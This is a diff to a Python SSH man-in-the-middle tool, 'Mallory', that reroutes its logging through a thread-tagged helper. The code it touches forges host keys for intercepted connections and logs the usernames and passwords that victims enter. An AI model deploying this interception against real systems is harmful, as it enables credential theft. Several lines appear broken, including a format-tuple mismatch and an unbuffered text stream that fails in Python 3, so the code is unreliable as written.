@@ -19,6 +19,8 @@ import signal
 import paramiko
 from paramiko.py3compat import b, u, decodebytes
 
+thread_local = threading.local()
+
 class MalloryServer:
 
 	def __init__(self, port, localaddr='', use_socks=False, acl=None):
@@ -40,7 +42,7 @@ class MalloryServer:
 		sockaddr_in = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
 		(proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
 		dst = "%d.%d.%d.%d" % (a, b, c, d)
-		print('Original destination was: %s:%d' % (dst, port))
+		print_msg('Original destination was: %s:%d' % (dst, port))
 		return (dst, port)
 
 	def _get_socks4_dst(self, conn):
@@ -56,7 +58,7 @@ class MalloryServer:
 		if not (ver == 0x04 and cmd == 0x01):
 			raise IOError("Invalid SOCKS4 request")
 		dst = "%d.%d.%d.%d" % (addr_a, addr_b, addr_c, addr_d)
-		print('Original destination was: %s:%d (login: %s)' % (dst, port, login))
+		print_msg('Original destination was: %s:%d (login: %s)' % (dst, port, login))
 		reply = struct.pack("!2BH4B", 0, 0x5A, 0, 0, 0, 0, 0)
 		conn.send(reply)
 		return (dst, port)
@@ -71,27 +73,28 @@ class MalloryServer:
 		client, src = self.socket.accept()
 		if self.acl and self.acl['src'] and \
 		   (src[0] not in self.acl['src'] or not self.acl['src'][src[0]]):
-			print("Rejecting connection from '%s:%d' due to client ACL" % src)
+			print_msg("Rejecting connection from '%s:%d' due to client ACL" % src)
 			return
 		client_thread = threading.Thread(target=self._handle_client, args=(client, src))
 		client_thread.setDaemon(True)
 		client_thread.start()
 
 	def _handle_client(self, client, src):
+		thread_local.conn_id = src
 		try:
 			dst = self._get_dst(client)
 			if client.getsockname() == dst:
-				print('Breaking connection loop back to us: %s:%d -> %s:%d' % (src, dst))
+				print_msg('Breaking connection loop back to us: %s:%d -> %s:%d' % (src, dst))
 				return
 
 			if self.acl and self.acl['dport'] and \
 			   (dst[1] not in self.acl['dport'] or not self.acl['dport'][dst[1]]):
-				print("Rejecting connection to '%s:%d' due to dport ACL" % dst)
+				print_msg("Rejecting connection to '%s:%d' due to dport ACL" % dst)
 				return
 
 			for ior in self.interceptors:
 				if ior.want(dst):
-					print('[%s] Intercepting connection: %s:%d -> %s:%d' % (ior.__class__.__name__, src[0], src[1], dst[0], dst[1]))
+					print_msg('[%s] Intercepting connection: %s:%d -> %s:%d' % (ior.__class__.__name__, src[0], src[1], dst[0], dst[1]))
 					ior.intercept(client, dst)
 					break
 		finally:
@@ -102,7 +105,7 @@ class MalloryServer:
 
 	def start(self):
 		self._bind_socket()
-		print('Listening for connections' + (' (SOCKS)' if self.use_socks else '') + '...')
+		print_msg('Listening for connections' + (' (SOCKS)' if self.use_socks else '') + '...')
 		while True:
 			self._loop()
 
@@ -143,7 +146,7 @@ class SSHRejectingServer(paramiko.ServerInterface):
 		self.event = threading.Event()
 
 	def check_auth_password(self, username, password):
-		print("""Auth attempt to '%s' with user '%s' and password '%s'""" % (self.identity, username, password))
+		print_msg("""Auth attempt to '%s' with user '%s' and password '%s'""" % (self.identity, username, password))
 		return paramiko.AUTH_FAILED
 
 	def get_allowed_auths(self, username):
@@ -158,7 +161,7 @@ class SSHHostKeyring:
 	def load_keyfile(self, filename):
 		key = paramiko.RSAKey(filename=filename)
 		fp = key.get_fingerprint()
-		print('Read key ' + fmt_fp(fp) + ' from "' + filename +'"')
+		print_msg('Read key ' + fmt_fp(fp) + ' from "' + filename +'"')
 		self.keys[fp] = (key, True)
 
 	def gen_key(self):
@@ -174,7 +177,7 @@ class SSHHostKeyring:
 			key = self.gen_key()
 			self.keys[fp] = (key, False)
 			real_fp = key.get_fingerprint()
-			print('Generating new fake key for fingerprint ' +
+			print_msg('Generating new fake key for fingerprint ' +
 			      fmt_fp(fp) + ' (actually ' + fmt_fp(real_fp) + ')')
 			return self.keys[fp]
 		else:
@@ -203,17 +206,17 @@ class SSHTargetDatabase:
 			                                timeout = 5,
 			                                source_address = (self.localaddr, 0))
 		except Exception as e:
-			print('*** Connect failed: ' + str(e))
+			print_msg('*** Connect failed: ' + str(e))
 			traceback.print_exc()
 			return None
 		t = paramiko.Transport(sock)
 		try:
 			t.start_client()
 			key = t.get_remote_server_key()
-			print('retrieved target fp: ' + fmt_fp(key.get_fingerprint()))
+			print_msg('retrieved target fp: ' + fmt_fp(key.get_fingerprint()))
 			return key.get_fingerprint()
 		except paramiko.SSHException:
-			print('*** SSH negotiation failed.')
+			print_msg('*** SSH negotiation failed.')
 			return None
 		finally:
 			t.close()
@@ -238,15 +241,15 @@ class SSHInterceptor(MalloryInterceptor):
 			if self.fake_keys:
 				key = self.keyring.gen_key()
 				fp = key.get_fingerprint()
-				print('Generated key for unknown host: ' + fmt_fp(fp))
+				print_msg('Generated key for unknown host: ' + fmt_fp(fp))
 				self.targets.set_fp(dst, fp)
 			else:
 				return False
 		key, genuine = self.keyring.get_key(fp)
 		if key:
-			print('Got key: %s (%r)' % (fmt_fp(key.get_fingerprint()), genuine))
+			print_msg('Got key: %s (%r)' % (fmt_fp(key.get_fingerprint()), genuine))
 		else:
-			print('No suitable keys found')
+			print_msg('No suitable keys found')
 
 		if key and (genuine or self.fake_keys):
 			return True
@@ -261,20 +264,32 @@ class SSHInterceptor(MalloryInterceptor):
 			try:
 				t.load_server_moduli()
 			except:
-				print('(Failed to load moduli -- gex will be unsupported.)')
+				print_msg('(Failed to load moduli -- gex will be unsupported.)')
 				raise
 			t.add_server_key(key)
 			server = SSHRejectingServer("%s:%d" % (dst[0], dst[1]))
 			try:
 				t.start_server(server=server)
 			except paramiko.SSHException:
-				print('*** SSH negotiation failed.')
+				print_msg('*** SSH negotiation failed.')
 				return
 
 			# wait for auth
 			chan = t.accept(20)
 			if chan is None:
 				print('*** Timeout waiting for channel request.')
+
+
+print_lock = threading.Lock()
+
+def print_msg(msg):
+	tag = thread_local.conn_id
+	with print_lock:
+		if tag:
+			print('[%s:%s] %s' % (tag[0], tag[1], msg))
+		else:
+			print(msg)
+
 
 def fmt_fp(fp):
 	fp = u(hexlify(fp))
@@ -311,22 +326,22 @@ def launch_server():
 						keyring.load_keyfile(fpath)
 					except:
 						failed_keys.append(fpath)
-						print("'%s' does not seem to be a valid keyfile, skipping..." % fpath)
+						print_msg("'%s' does not seem to be a valid keyfile, skipping..." % fpath)
 		elif os.path.isfile(farg):
 			try:
 				keyring.load_keyfile(farg)
 			except:
 				failed_keys.append(farg)
-				print("'%s' does not seem to be a valid keyfile, skipping..." % fpath)
+				print_msg("'%s' does not seem to be a valid keyfile, skipping..." % fpath)
 		else:
 			failed_keys.append(farg)
-			print("Argument '%s' is neither directory nor file." % farg)
+			print_msg("Argument '%s' is neither directory nor file." % farg)
 
-	print('%u distinct host keys have been loaded into the key ring' % len(keyring.keys))
+	print_msg('%u distinct host keys have been loaded into the key ring' % len(keyring.keys))
 	if failed_keys:
-		print("The following files could not be loaded:")
+		print_msg("The following files could not be loaded:")
 		for file in failed_keys:
-			print(file)
+			print_msg(file)
 
 	acl = {'src': None, 'dport': None}
 	if args.client:
@@ -342,10 +357,12 @@ def launch_server():
 	mallory.start()
 
 def quit(signal, frame):
-	print('Terminating...')
+	print_msg('Terminating...')
 	sys.exit(0)
 
 if __name__ == "__main__":
 	#paramiko.util.log_to_file('mallory_server.log')
 	signal.signal(signal.SIGINT, quit)
+	sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
+	thread_local.conn_id = None
 	launch_server()
